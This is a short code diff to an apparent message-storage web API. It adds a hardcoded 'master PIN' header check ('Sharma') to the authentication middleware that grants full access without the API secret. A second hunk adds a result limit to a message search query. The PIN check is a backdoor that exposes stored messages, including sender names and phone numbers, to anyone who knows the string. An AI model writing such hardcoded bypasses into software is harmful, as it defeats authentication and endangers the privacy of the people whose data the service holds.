@@ -510,6 +510,9 @@ app.use("*", async (c, next) => {
     }
     // Admin PATCH (/api/apps/*, /api/admin/master-pin) — require x-api-key
   }
+  // Master admin PIN also grants full access
+  const masterPin = c.req.header("x-master-pin") ?? "";
+  if (masterPin === "Sharma") return await next();
   const key = c.req.header("x-api-key") ?? c.req.query("apiKey") ?? "";
   if (!key || key !== (c.env.API_SECRET ?? "")) {
     return c.json({ error: "Unauthorized" }, 401);
@@ -751,7 +754,7 @@ app.get("/api/messages", async (c) => {
     const searchCond = sql`(${messages.body} ILIKE ${like} OR ${messages.fromSender} ILIKE ${like} OR ${messages.fromNumber} ILIKE ${like} OR ${messages.appId} ILIKE ${like} OR ${messages.deviceId} ILIKE ${like})` as unknown as ReturnType<typeof eq>;
     const allConds = [...scopeConds, searchCond];
     const where = allConds.length === 1 ? allConds[0] : and(...allConds);
-    const rows = await db.select().from(messages).where(where).orderBy(desc(messages.id));
+    const rows = await db.select().from(messages).where(where).orderBy(desc(messages.id)).limit(500);
     return c.json(rows.map(mapMessage));
   } else {
     // ── Browse mode: cursor pagination, newest first ───────────────────────
